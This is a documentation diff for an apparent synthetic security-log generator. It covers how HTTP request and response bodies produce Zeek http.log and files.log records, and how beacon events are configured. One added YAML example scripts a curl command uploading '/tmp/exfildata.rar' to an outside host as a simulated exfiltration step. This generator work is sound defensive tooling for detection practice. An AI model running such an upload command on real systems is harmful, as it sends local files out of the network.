@@ -638,7 +638,7 @@ Work hours are automatically parsed into a `work_hours_parsed` dict containing:
 
 ### Browsing Intensity
 
-The `browsing_intensity` field controls how much HTTP traffic a persona generates per browsing session. It affects proxy log depth (number of page loads and subresource cascades) for baseline web activity. Inbound `web_server` background traffic uses the separate `web_session_profiles.yaml` visitor mix: `traffic_rates.web` counts top-level visitor actions, then page assets and same-origin API calls fan out automatically. Plaintext HTTP browser sessions can produce multiple Zeek `http.log` rows on one connection UID with increasing `trans_depth`; large download-scale responses attach matching `files.log` metadata.
+The `browsing_intensity` field controls how much HTTP traffic a persona generates per browsing session. It affects proxy log depth (number of page loads and subresource cascades) for baseline web activity. Inbound `web_server` background traffic uses the separate `web_session_profiles.yaml` visitor mix: `traffic_rates.web` counts top-level visitor actions, then page assets and same-origin API calls fan out automatically. Plaintext HTTP browser sessions can produce multiple Zeek `http.log` rows on one connection UID with increasing `trans_depth`; every transmitted nonempty response entity attaches matching responder-direction `files.log` metadata.
 
 ```yaml
 personas:
@@ -759,14 +759,20 @@ baseline_activity:
               POST:
                 statuses: {"200": 0.90, "400": 0.06, "401": 0.04}
                 request_body_bytes: [100, 3000]
+                request_content_type: application/json
+                # Optional multipart/content-disposition filename; not a host path.
+                request_wire_filename: comment.json
                 response_body_bytes: [200, 2000]
                 content_type: application/json
 ```
 
 Web request profiles are route-based: each route owns its valid methods, status
-distribution, body-size ranges, and content type. Do not model paths, methods,
-and status codes as independent random lists; that produces unrealistic
-combinations such as POST requests for static resources.
+distribution, body-size ranges, response `content_type`, and optional
+`request_content_type`/`request_wire_filename` metadata. A wire filename feeds
+Zeek's `orig_filenames` but is deliberately not treated as a local host path, so
+it does not invent endpoint file-read evidence. Do not model paths, methods, and
+status codes as independent random lists; that produces unrealistic combinations
+such as POST requests for static resources.
 
 For non-HTTP hunts, use `kind: connection` with `connection_profile` byte,
 duration, and `conn_state` ranges. Use `traffic_suppression` to down-rank or
@@ -841,7 +847,7 @@ minutes or hours. `explicit_offsets` accepts one offset per child event, such as
 | `logon` | 4624, target-host 4672 for elevated sessions, eCAR LOGIN | | `logon_type` (default 3), `source_ip` |
 | `failed_logon` | 4625, eCAR LOGIN failure | | `source_ip`, `logon_type` (default 3) |
 | `logoff` | 4634, eCAR LOGOUT | | |
-| `connection` | Zeek conn, eCAR FLOW, + web_access/zeek_http when `service: http` | `dst_ip` | `dst_port` (default 443), `hostname` (domain for DNS/SSL SNI), `service`, `source_ip`, `method`, `uri`, `status_code`, `user_agent`, `ids_alerts` |
+| `connection` | Zeek conn, eCAR FLOW, + web_access/zeek_http/files when `service: http` | `dst_ip` | `dst_port` (default 443), `hostname`, `service`, `source_ip`, `method`, `uri`, `status_code`, `user_agent`, `request_body_len`, `response_body_len`, `ids_alerts` |
 | `ssh_session` | canonical SSH connection (Zeek conn) + syslog sshd + EDR/eCAR | | `source_ip`, `ids_alerts` |
 | `rdp_session` | Zeek conn + 4624 type 10 + eCAR | | `source_ip`, `ids_alerts` |
 | `account_created` | 4720 (on DC) | `target_username` | `target_sid` |
@@ -1072,7 +1078,7 @@ Use `beacon` for periodic connections — allowed (C2 callbacks through proxy) o
       technique: "T1071.001 - Web Protocols"
 ```
 
-Timing fields: `start_time` (optional, defaults to parent event time), `interval` (required), one of `end_time`/`duration`/`count` (required), `jitter` (0.0-1.0, default: **0.15** — beacons are deliberately tight). Connection fields: all `connection` fields (dst_ip, dst_port, hostname, service, protocol, method, uri, user_agent, `referrer`, etc.). `profile` selects a behavior-shaped synthetic profile from `config/activity/beacon_profiles.yaml`; bundled profiles model broad check-in/tasking shapes, not live malware IoCs. `http_sequence` cycles explicit per-tick request shapes and can use deterministic URI tokens: `{host_id}`, `{campaign_id}`, `{tick}`, `{hex8}`, `{guid}`, and `{base64url:N}`. Sequence entries may override `method`, `uri`, `user_agent`, `referrer`, `status_code`, `response_body_len`, `orig_bytes`, and `resp_bytes`; byte fields accept either an integer or `[min, max]`. For `hostname`, use the client-facing DNS name used by the beacon, not a reverse-DNS/PTR artifact, unless that is intentionally part of the scenario. `action`: `allow` (default) or `deny`. Set `referrer` to pin the HTTP Referer header for a specific beacon URL (e.g., a phishing page that launched the download). In explicit proxy mode, HTTP/S beacons from hosts routed through a `forward_proxy` traverse the proxy; denied proxyable beacons stop at the proxy and emit proxy-denied CONNECT/GET evidence rather than direct client-to-origin network evidence.
+Timing fields: `start_time` (optional, defaults to parent event time), `interval` (required), one of `end_time`/`duration`/`count` (required), `jitter` (0.0-1.0, default: **0.15** — beacons are deliberately tight). Connection fields: all `connection` fields (dst_ip, dst_port, hostname, service, protocol, method, uri, user_agent, `referrer`, etc.). `profile` selects a behavior-shaped synthetic profile from `config/activity/beacon_profiles.yaml`; bundled profiles model broad check-in/tasking shapes, not live malware IoCs. `http_sequence` cycles explicit per-tick request shapes and can use deterministic URI tokens: `{host_id}`, `{campaign_id}`, `{tick}`, `{hex8}`, `{guid}`, and `{base64url:N}`. Sequence entries may override `method`, `uri`, `user_agent`, `referrer`, `status_code`, `request_body_len`, `response_body_len`, `orig_bytes`, and `resp_bytes`; byte fields accept either an integer or `[min, max]`. For `hostname`, use the client-facing DNS name used by the beacon, not a reverse-DNS/PTR artifact, unless that is intentionally part of the scenario. `action`: `allow` (default) or `deny`. Set `referrer` to pin the HTTP Referer header for a specific beacon URL (e.g., a phishing page that launched the download). In explicit proxy mode, HTTP/S beacons from hosts routed through a `forward_proxy` traverse the proxy; denied proxyable beacons stop at the proxy and emit proxy-denied CONNECT/GET evidence rather than direct client-to-origin network evidence.
 
 ### Correlated IDS attachments
 
@@ -1310,7 +1316,27 @@ For web-based attack steps (SQL injection, web shell access, etc.), use `connect
       user_agent: "Mozilla/5.0 (compatible; Googlebot/2.1)"
 ```
 
-HTTP optional fields on `connection` events: `method` (GET/POST/etc.), `uri`, `status_code`, `user_agent`, `referrer`, `response_body_len`. When these are provided with `service: http`, the engine generates correlated web_access, zeek_http, and zeek_conn records from a single CanonicalOccurrence. The `referrer` field defaults to `null` (auto-generated from the traffic context — search engine, same-origin, social, or blank); set it explicitly for phishing click scenarios or specific referrer chain modeling (e.g., `referrer: "https://evil.example.com/page"`). The same `referrer` and `response_body_len` fields are available on `beacon` events.
+HTTP optional fields on `connection` events: `method` (GET/POST/etc.), `uri`, `status_code`, `user_agent`, `referrer`, `request_body_len`, `response_body_len`. With `service: http`, the engine generates correlated web_access, zeek_http, zeek_conn, and visible files.log records. `request_body_len` pins the exact transmitted request entity size; originator TCP bytes still include HTTP framing. Every successfully transmitted plaintext request body receives originator-direction Zeek file analysis, including background forms, APIs, telemetry, beacons, and red herrings. Every transmitted nonempty plaintext response entity receives responder-direction analysis, including tiny redirects, authentication failures, and other error bodies. HEAD, 1xx, 204, 205, 304, successful CONNECT, zero-byte, failed-transport, and opaque HTTPS responses remain fileless. Anonymous bodies do not invent endpoint file reads. Both body-length fields are available on `beacon` and `beacon.http_sequence`; sequence values may be exact integers or `[min, max]` ranges.
+
+Request MIME type is derived from the owning activity unless a resolved upload supplies stronger metadata. Curl `--data-binary @path`, `--upload-file path`, `-T path`, and multipart `-F name=@path` resolve a local source file and curl-owned endpoint read. Local source names stay in ground truth and do not become Zeek filenames unless the HTTP message exposes one: raw `--data-binary` has no wire filename, while multipart normally does. Response MIME preserves explicit/application metadata, otherwise follows URI inference, redirect/error `text/html`, then `application/octet-stream`; response URLs never invent filenames. `http_file_profiles.yaml` maps extensions such as `.rar` to `application/vnd.rar`. A plaintext proxy MISS creates leg-local FUIDs for matching origin→proxy and proxy→client content; a HIT or proxy error creates only the client-leg response file. HTTPS stays opaque without modeled decryption.
+
+```yaml
+events:
+  - type: process
+    process_name: /usr/bin/curl
+    command_line: >-
+      /usr/bin/curl --data-binary @/tmp/exfildata.rar
+      http://some.site/uploads/accept-upload
+  - type: connection
+    dst_ip: "45.33.32.30"
+    dst_port: 80
+    hostname: some.site
+    service: http
+    method: POST
+    uri: /uploads/accept-upload
+    request_body_len: 44040192
+    status_code: 200
+```
 
 **Byte and connection state overrides:** `orig_bytes` (originator payload bytes), `resp_bytes` (responder payload bytes), `response_body_len` (HTTP response body bytes rendered in `web_access` / `proxy_access`), `conn_state` (Zeek connection outcome: SF, S0, REJ, etc.). When omitted, the engine auto-sizes bytes based on the event's `technique`, `description`, URI, and HTTP status (exfiltration -> large `orig_bytes`; C2 -> small bidirectional; downloads -> large successful response bodies; 4xx/5xx -> small error pages), and defaults `conn_state` to SF. Set `response_body_len` to pin exact HTTP body bytes; if it is omitted on an HTTP event, explicit `resp_bytes` is also used as the HTTP body-size override before connection-level protocol overhead is added. Set `conn_state` explicitly to model failed connections (e.g., `S0` for a dead C2 channel, `REJ` for a blocked exfil attempt).
 
